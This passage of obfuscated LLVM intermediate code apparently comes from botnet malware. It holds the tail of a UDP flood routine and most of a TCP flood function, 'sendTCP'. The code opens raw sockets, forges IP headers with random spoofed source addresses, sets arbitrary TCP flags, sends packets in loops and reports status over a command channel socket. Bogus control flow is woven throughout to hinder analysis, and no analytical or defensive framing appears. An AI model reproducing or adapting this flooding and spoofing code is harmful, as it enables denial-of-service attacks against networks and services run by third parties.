  %499 = icmp eq i32 %498, 0
  %500 = icmp slt i32 %495, 10
  %501 = or i1 %499, %500
  br i1 %501, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %493
  %502 = load i32, i32* @x.65
  %503 = load i32, i32* @y.66
  %504 = sub i32 %502, 1
  %505 = mul i32 %502, %504
  %506 = urem i32 %505, 2
  %507 = icmp eq i32 %506, 0
  %508 = icmp slt i32 %503, 10
  %509 = or i1 %507, %508
  br i1 %509, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %31
  %510 = call i32 @rand_cmwc()
  %511 = trunc i32 %510 to i16
  %512 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %511, i16* %512, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %56
  %513 = load i8*, i8** %7, align 8
  %514 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %515 = call i32 @getHost(i8* %513, %struct.in_addr* %514)
  %516 = icmp ne i32 %515, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %99
  %517 = load i8*, i8** %16, align 8
  %518 = load i32, i32* %11, align 4
  %_ = sub i32 0, %518
  %gen = add i32 %_, 1
  %519 = add nsw i32 %518, 1
  %520 = sext i32 %519 to i64
  call void @llvm.memset.p0i8.i64(i8* %517, i8 0, i64 %520, i32 1, i1 false)
  %521 = load i8*, i8** %16, align 8
  %522 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %521, i32 %522)
  %523 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %524 = load i32, i32* %9, align 4
  %525 = add nsw i32 %523, %524
  store i32 %525, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %125
  %526 = load i32, i32* %15, align 4
  %527 = load i8*, i8** %16, align 8
  %528 = load i32, i32* %11, align 4
  %529 = sext i32 %528 to i64
  %530 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %531 = call i64 @sendto(i32 %526, i8* %527, i64 %529, i32 0, %struct.sockaddr* %530, i32 16)
  %532 = load i32, i32* %18, align 4
  %533 = load i32, i32* %14, align 4
  %534 = icmp eq i32 %532, %533
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %163
  store i32 0, i32* %18, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %180
  %535 = load i32, i32* %18, align 4
  %_19 = sub i32 %535, 1
  %gen20 = mul i32 %_19, 1
  %_21 = sub i32 0, %535
  %gen22 = add i32 %_21, 1
  %_23 = shl i32 %535, 1
  %_24 = sub i32 %535, 1
  %gen25 = mul i32 %_24, 1
  %_26 = shl i32 %535, 1
  %_27 = sub i32 %535, 1
  %gen28 = mul i32 %_27, 1
  %_29 = shl i32 %535, 1
  %536 = add i32 %535, 1
  store i32 %536, i32* %18, align 4
  br label %originalBB18

originalBB33alteredBB:                            ; preds = %originalBB33, %216
  %537 = load i32, i32* %21, align 4
  %_34 = sub i32 0, %537
  %gen35 = add i32 %_34, -1
  %538 = add nsw i32 %537, -1
  store i32 %538, i32* %21, align 4
  %539 = icmp ne i32 %537, 0
  br label %originalBB33

originalBB39alteredBB:                            ; preds = %originalBB39, %236
  %540 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %541 = call i32 @rand_cmwc()
  %_40 = sub i32 %540, %541
  %gen41 = mul i32 %_40, %541
  %_42 = sub i32 0, %540
  %gen43 = add i32 %_42, %541
  %_44 = sub i32 %540, %541
  %gen45 = mul i32 %_44, %541
  %_46 = sub i32 0, %540
  %gen47 = add i32 %_46, %541
  %542 = xor i32 %540, %541
  call void @srand(i32 %542) #2
  %543 = call i32 @rand() #2
  call void @init_rand(i32 %543)
  br label %originalBB39

originalBB51alteredBB:                            ; preds = %originalBB51, %260
  store i32 0, i32* %22, align 4
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %283
  %544 = load i32, i32* %11, align 4
  %545 = sext i32 %544 to i64
  %_56 = shl i64 28, %545
  %_57 = shl i64 28, %545
  %_58 = sub i64 28, %545
  %gen59 = mul i64 %_58, %545
  %_60 = shl i64 28, %545
  %_61 = sub i64 28, %545
  %gen62 = mul i64 %_61, %545
  %_63 = shl i64 28, %545
  %546 = add i64 28, %545
  %547 = call i8* @llvm.stacksave()
  store i8* %547, i8** %23, align 8
  %548 = alloca i8, i64 %546, align 16
  %549 = bitcast i8* %548 to %struct.iphdr*
  store %struct.iphdr* %549, %struct.iphdr** %24, align 8
  %550 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %551 = bitcast %struct.iphdr* %550 to i8*
  %552 = getelementptr i8, i8* %551, i64 20
  %553 = bitcast i8* %552 to %struct.udphdr*
  store %struct.udphdr* %553, %struct.udphdr** %25, align 8
  %554 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %555 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %556 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %555, i32 0, i32 0
  %557 = load i32, i32* %556, align 4
  %558 = load i32, i32* %22, align 4
  %559 = call i32 @getRandomIP(i32 %558)
  %560 = call i32 @htonl(i32 %559) #13
  %561 = load i32, i32* %11, align 4
  %562 = sext i32 %561 to i64
  %_64 = shl i64 8, %562
  %563 = add i64 8, %562
  %564 = trunc i64 %563 to i32
  call void @makeIPPacket(%struct.iphdr* %554, i32 %557, i32 %560, i8 zeroext 17, i32 %564)
  %565 = load i32, i32* %11, align 4
  %566 = sext i32 %565 to i64
  %_65 = shl i64 8, %566
  %_66 = sub i64 0, 8
  %gen67 = add i64 %_66, %566
  %_68 = sub i64 8, %566
  %gen69 = mul i64 %_68, %566
  %567 = add i64 8, %566
  %568 = trunc i64 %567 to i16
  %569 = call zeroext i16 @htons(i16 zeroext %568) #13
  %570 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %571 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %570, i32 0, i32 0
  %572 = bitcast %union.anon.2* %571 to %struct.anon.3*
  %573 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %572, i32 0, i32 2
  store i16 %569, i16* %573, align 2
  %574 = call i32 @rand_cmwc()
  %575 = trunc i32 %574 to i16
  %576 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %577 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %576, i32 0, i32 0
  %578 = bitcast %union.anon.2* %577 to %struct.anon.3*
  %579 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %578, i32 0, i32 0
  store i16 %575, i16* %579, align 2
  %580 = load i32, i32* %8, align 4
  %581 = icmp eq i32 %580, 0
  br label %originalBB55

originalBB73alteredBB:                            ; preds = %originalBB73, %340
  %582 = load i32, i32* %8, align 4
  %583 = trunc i32 %582 to i16
  %584 = call zeroext i16 @htons(i16 zeroext %583) #13
  %585 = zext i16 %584 to i32
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %388
  %586 = load i32, i32* %19, align 4
  %587 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %588 = call i64 @sendto(i32 %586, i8* %296, i64 %294, i32 0, %struct.sockaddr* %587, i32 16)
  %589 = call i32 @rand_cmwc()
  %590 = trunc i32 %589 to i16
  %591 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %592 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %591, i32 0, i32 0
  %593 = bitcast %union.anon.2* %592 to %struct.anon.3*
  %594 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %593, i32 0, i32 0
  store i16 %590, i16* %594, align 2
  %595 = load i32, i32* %8, align 4
  %596 = icmp eq i32 %595, 0
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %418
  %597 = load i32, i32* %8, align 4
  %598 = trunc i32 %597 to i16
  %599 = call zeroext i16 @htons(i16 zeroext %598) #13
  %600 = zext i16 %599 to i32
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %470
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %493
  br label %originalBB89
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %61

; <label>:44:                                     ; preds = %39
  %45 = load i32, i32* @x.67
  %46 = load i32, i32* @y.68
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %44
  %53 = load i32, i32* @x.67
  %54 = load i32, i32* @y.68
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %579

; <label>:61:                                     ; preds = %39
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %63 = getelementptr inbounds [8 x i8], [8 x i8]* %62, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %63, i8 0, i64 8, i32 4, i1 false)
  %64 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %64, i32* %17, align 4
  %65 = load i32, i32* %17, align 4
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %70, label %67

; <label>:67:                                     ; preds = %61
  %68 = load i32, i32* @mainCommSock, align 4
  %69 = call i32 (i32, i8*, ...) @sockprintf(i32 %68, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i32 0, i32 0))
  br label %579

; <label>:70:                                     ; preds = %61
  %71 = load i32, i32* @x.67
  %72 = load i32, i32* @y.68
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %70
  store i32 1, i32* %18, align 4
  %79 = load i32, i32* %17, align 4
  %80 = bitcast i32* %18 to i8*
  %81 = call i32 @setsockopt(i32 %79, i32 0, i32 3, i8* %80, i32 4) #2
  %82 = icmp slt i32 %81, 0
  %83 = load i32, i32* @x.67
  %84 = load i32, i32* @y.68
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %82, label %91, label %110

; <label>:91:                                     ; preds = %originalBBpart24
  %92 = load i32, i32* @x.67
  %93 = load i32, i32* @y.68
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %91
  %100 = load i32, i32* @mainCommSock, align 4
  %101 = call i32 (i32, i8*, ...) @sockprintf(i32 %100, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.36, i32 0, i32 0))
  %102 = load i32, i32* @x.67
  %103 = load i32, i32* @y.68
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %579

; <label>:110:                                    ; preds = %originalBBpart24
  %111 = load i32, i32* %11, align 4
  %112 = icmp eq i32 %111, 0
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %110
  store i32 0, i32* %19, align 4
  br label %120

; <label>:114:                                    ; preds = %110
  %115 = load i32, i32* %11, align 4
  %116 = sub nsw i32 32, %115
  %117 = shl i32 1, %116
  %118 = sub nsw i32 %117, 1
  %119 = xor i32 %118, -1
  store i32 %119, i32* %19, align 4
  br label %120

; <label>:120:                                    ; preds = %114, %113
  %121 = load i32, i32* %13, align 4
  %122 = sext i32 %121 to i64
  %123 = add i64 40, %122
  %124 = call i8* @llvm.stacksave()
  store i8* %124, i8** %20, align 8
  %125 = alloca i8, i64 %123, align 16
  %126 = bitcast i8* %125 to %struct.iphdr*
  store %struct.iphdr* %126, %struct.iphdr** %21, align 8
  %127 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %128 = bitcast %struct.iphdr* %127 to i8*
  %129 = getelementptr i8, i8* %128, i64 20
  %130 = bitcast i8* %129 to %struct.tcphdr*
  store %struct.tcphdr* %130, %struct.tcphdr** %22, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %132 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %133 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %132, i32 0, i32 0
  %134 = load i32, i32* %133, align 4
  %135 = load i32, i32* %19, align 4
  %136 = call i32 @getRandomIP(i32 %135)
  %137 = call i32 @htonl(i32 %136) #13
  %138 = load i32, i32* %13, align 4
  %139 = sext i32 %138 to i64
  %140 = add i64 20, %139
  %141 = trunc i64 %140 to i32
  call void @makeIPPacket(%struct.iphdr* %131, i32 %134, i32 %137, i8 zeroext 6, i32 %141)
  %142 = call i32 @rand_cmwc()
  %143 = trunc i32 %142 to i16
  %144 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i32 0, i32 0
  %146 = bitcast %union.anon.0* %145 to %struct.anon.1*
  %147 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %146, i32 0, i32 0
  store i16 %143, i16* %147, align 4
  %148 = call i32 @rand_cmwc()
  %149 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i32 0, i32 0
  %151 = bitcast %union.anon.0* %150 to %struct.anon.1*
  %152 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %151, i32 0, i32 2
  store i32 %148, i32* %152, align 4
  %153 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %154 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %153, i32 0, i32 0
  %155 = bitcast %union.anon.0* %154 to %struct.anon.1*
  %156 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %155, i32 0, i32 3
  store i32 0, i32* %156, align 4
  %157 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %158 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %157, i32 0, i32 0
  %159 = bitcast %union.anon.0* %158 to %struct.anon.1*
  %160 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %159, i32 0, i32 4
  %161 = load i16, i16* %160, align 4
  %162 = and i16 %161, -241
  %163 = or i16 %162, 80
  store i16 %163, i16* %160, align 4
  %164 = load i8*, i8** %12, align 8
  %165 = call i32 @strcmp(i8* %164, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.37, i32 0, i32 0)) #10
  %166 = icmp ne i32 %165, 0
  br i1 %166, label %203, label %167

; <label>:167:                                    ; preds = %120
  %168 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %169 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %168, i32 0, i32 0
  %170 = bitcast %union.anon.0* %169 to %struct.anon.1*
  %171 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %170, i32 0, i32 4
  %172 = load i16, i16* %171, align 4
  %173 = and i16 %172, -513
  %174 = or i16 %173, 512
  store i16 %174, i16* %171, align 4
  %175 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %176 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %175, i32 0, i32 0
  %177 = bitcast %union.anon.0* %176 to %struct.anon.1*
  %178 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %177, i32 0, i32 4
  %179 = load i16, i16* %178, align 4
  %180 = and i16 %179, -1025
  %181 = or i16 %180, 1024
  store i16 %181, i16* %178, align 4
  %182 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %183 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %182, i32 0, i32 0
  %184 = bitcast %union.anon.0* %183 to %struct.anon.1*
  %185 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %184, i32 0, i32 4
  %186 = load i16, i16* %185, align 4
  %187 = and i16 %186, -257
  %188 = or i16 %187, 256
  store i16 %188, i16* %185, align 4
  %189 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %190 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %189, i32 0, i32 0
  %191 = bitcast %union.anon.0* %190 to %struct.anon.1*
  %192 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %191, i32 0, i32 4
  %193 = load i16, i16* %192, align 4
  %194 = and i16 %193, -4097
  %195 = or i16 %194, 4096
  store i16 %195, i16* %192, align 4
  %196 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  %198 = bitcast %union.anon.0* %197 to %struct.anon.1*
  %199 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %198, i32 0, i32 4
  %200 = load i16, i16* %199, align 4
  %201 = and i16 %200, -2049
  %202 = or i16 %201, 2048
  store i16 %202, i16* %199, align 4
  br label %408

; <label>:203:                                    ; preds = %120
  %204 = load i8*, i8** %12, align 8
  %205 = call i8* @strtok(i8* %204, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %205, i8** %23, align 8
  br label %206

; <label>:206:                                    ; preds = %405, %203
  %207 = load i8*, i8** %23, align 8
  %208 = icmp ne i8* %207, null
  br i1 %208, label %209, label %407

; <label>:209:                                    ; preds = %206
  %210 = load i32, i32* @x.67
  %211 = load i32, i32* @y.68
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %209
  %218 = load i8*, i8** %23, align 8
  %219 = call i32 @strcmp(i8* %218, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %220 = icmp ne i32 %219, 0
  %221 = load i32, i32* @x.67
  %222 = load i32, i32* @y.68
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %220, label %253, label %229

; <label>:229:                                    ; preds = %originalBBpart212
  %230 = load i32, i32* @x.67
  %231 = load i32, i32* @y.68
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %229
  %238 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 0
  %240 = bitcast %union.anon.0* %239 to %struct.anon.1*
  %241 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = and i16 %242, -513
  %244 = or i16 %243, 512
  store i16 %244, i16* %241, align 4
  %245 = load i32, i32* @x.67
  %246 = load i32, i32* @y.68
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBBpart234, label %originalBB14alteredBB

originalBBpart234:                                ; preds = %originalBB14
  br label %405

; <label>:253:                                    ; preds = %originalBBpart212
  %254 = load i8*, i8** %23, align 8
  %255 = call i32 @strcmp(i8* %254, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.40, i32 0, i32 0)) #10
  %256 = icmp ne i32 %255, 0
  br i1 %256, label %265, label %257

; <label>:257:                                    ; preds = %253
  %258 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 0
  %260 = bitcast %union.anon.0* %259 to %struct.anon.1*
  %261 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %260, i32 0, i32 4
  %262 = load i16, i16* %261, align 4
  %263 = and i16 %262, -1025
  %264 = or i16 %263, 1024
  store i16 %264, i16* %261, align 4
  br label %404

; <label>:265:                                    ; preds = %253
  %266 = load i8*, i8** %23, align 8
  %267 = call i32 @strcmp(i8* %266, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.41, i32 0, i32 0)) #10
  %268 = icmp ne i32 %267, 0
  br i1 %268, label %293, label %269

; <label>:269:                                    ; preds = %265
  %270 = load i32, i32* @x.67
  %271 = load i32, i32* @y.68
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %269
  %278 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 0
  %280 = bitcast %union.anon.0* %279 to %struct.anon.1*
  %281 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %280, i32 0, i32 4
  %282 = load i16, i16* %281, align 4
  %283 = and i16 %282, -257
  %284 = or i16 %283, 256
  store i16 %284, i16* %281, align 4
  %285 = load i32, i32* @x.67
  %286 = load i32, i32* @y.68
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBBpart253, label %originalBB36alteredBB

originalBBpart253:                                ; preds = %originalBB36
  br label %387

; <label>:293:                                    ; preds = %265
  %294 = load i32, i32* @x.67
  %295 = load i32, i32* @y.68
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %293
  %302 = load i8*, i8** %23, align 8
  %303 = call i32 @strcmp(i8* %302, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i32 0, i32 0)) #10
  %304 = icmp ne i32 %303, 0
  %305 = load i32, i32* @x.67
  %306 = load i32, i32* @y.68
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br i1 %304, label %321, label %313

; <label>:313:                                    ; preds = %originalBBpart257
  %314 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon.0* %315 to %struct.anon.1*
  %317 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %316, i32 0, i32 4
  %318 = load i16, i16* %317, align 4
  %319 = and i16 %318, -4097
  %320 = or i16 %319, 4096
  store i16 %320, i16* %317, align 4
  br label %370

; <label>:321:                                    ; preds = %originalBBpart257
  %322 = load i32, i32* @x.67
  %323 = load i32, i32* @y.68
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %321
  %330 = load i8*, i8** %23, align 8
  %331 = call i32 @strcmp(i8* %330, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.43, i32 0, i32 0)) #10
  %332 = icmp ne i32 %331, 0
  %333 = load i32, i32* @x.67
  %334 = load i32, i32* @y.68
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br i1 %332, label %365, label %341

; <label>:341:                                    ; preds = %originalBBpart261
  %342 = load i32, i32* @x.67
  %343 = load i32, i32* @y.68
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %341
  %350 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %351 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %350, i32 0, i32 0
  %352 = bitcast %union.anon.0* %351 to %struct.anon.1*
  %353 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %352, i32 0, i32 4
  %354 = load i16, i16* %353, align 4
  %355 = and i16 %354, -2049
  %356 = or i16 %355, 2048
  store i16 %356, i16* %353, align 4
  %357 = load i32, i32* @x.67
  %358 = load i32, i32* @y.68
  %359 = sub i32 %357, 1
  %360 = mul i32 %357, %359
  %361 = urem i32 %360, 2
  %362 = icmp eq i32 %361, 0
  %363 = icmp slt i32 %358, 10
  %364 = or i1 %362, %363
  br i1 %364, label %originalBBpart274, label %originalBB63alteredBB

originalBBpart274:                                ; preds = %originalBB63
  br label %369

; <label>:365:                                    ; preds = %originalBBpart261
  %366 = load i32, i32* @mainCommSock, align 4
  %367 = load i8*, i8** %23, align 8
  %368 = call i32 (i32, i8*, ...) @sockprintf(i32 %366, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.44, i32 0, i32 0), i8* %367)
  br label %369

; <label>:369:                                    ; preds = %365, %originalBBpart274
  br label %370

; <label>:370:                                    ; preds = %369, %313
  %371 = load i32, i32* @x.67
